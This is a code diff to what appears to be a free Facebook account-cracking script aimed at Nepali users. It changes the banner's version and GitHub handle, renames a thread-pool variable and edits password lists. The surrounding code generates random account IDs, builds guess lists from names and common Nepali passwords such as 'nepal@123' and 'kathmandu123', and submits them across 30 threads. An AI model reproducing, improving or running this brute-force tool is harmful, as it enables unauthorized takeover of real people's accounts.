@@ -230,9 +230,9 @@ logo=("""
                                                            
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━┓
  ┃𝐀𝐃𝐌𝐈𝐍:HANDSOME             ┃𝐒𝐓𝐀𝐓𝐔𝐒:FREE        ┃
- ┃𝐅𝐁 𝐈𝐃:DI W AS              ┃𝐕𝐄𝐑𝐒𝐈𝐎𝐍:1.2        ┃
+ ┃𝐅𝐁 𝐈𝐃:DI W AS              ┃𝐕𝐄𝐑𝐒𝐈𝐎𝐍:1.3        ┃
  ┣━━━━━━━━━━━━━━━━━━━━━━━━━┳━┻━━━━━━━━━━━━━━━━━━━┫
- ┃𝐆𝐈𝐓𝐇𝐔𝐁:HANDSOMEXSAMIR    ┃ 𝐓𝐎𝐎𝐋 : FILE         |
+ ┃𝐆𝐈𝐓𝐇𝐔𝐁:VANDAINA          ┃ 𝐓𝐎𝐎𝐋 : FILE         |
  ┗━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━┛
 \033[1;32m----------------------------------------------""")
 def linex():
@@ -328,15 +328,11 @@ def file():
                                         plist.append('first@12345')        
                                         plist.append('first123@')
                                         plist.append('@first123')
-                                        plist.append('first123456789')         
-                                        plist.append('first456')
-                                        plist.append('first111')       
-                                        plist.append('maya123')     
+                                        plist.append('first123456789')        
                                         plist.append('firstlast123')       
                                         plist.append('firstlast@123')   
                                         plist.append('last123')
                                         plist.append('last@123') 
-                                        plist.append('last111')
                                         plist.append('Nepal123')
                                         plist.append('nepal@123')
                                 else:
@@ -441,9 +437,9 @@ def npxind():
                                 elif pcs in ['2','02']:     
                                     passlist = [psx,ids,'nepal123','nepal1234','nepal@123','sagar123','i love you','freefire','Nepal@123','free fire','kathmandu','kathmandu123','sagarmatha123','machikney123','maya123','maya1234','maya12345,']                             
                                 if mthd in ['1','01']:                                 
-                                    ALONE.submit(rndm1,ids,passlist)
+                                    HANDSOME.submit(rndm1,ids,passlist)
                                 if mthd in ['2','02']:    
-                                    ALONE.submit(rndm,ids,passlist)                                	
+                                    HANDSOME.submit(rndm,ids,passlist)                                	
                 print('\033[1;37m')
                 linex()
                 print(' The process has completed')
@@ -512,7 +508,7 @@ def bd():
                 for nmbr in range(limit):
                         nmp = ''.join(random.choice(string.digits) for _ in range(8))
                         user.append(nmp)
-                with tred(max_workers=30) as ALONE:     
+                with tred(max_workers=30) as HANDSOME:     
                         clear()
                         id = str(len(user))
                         print('Total account : \033[1;32m'+id)
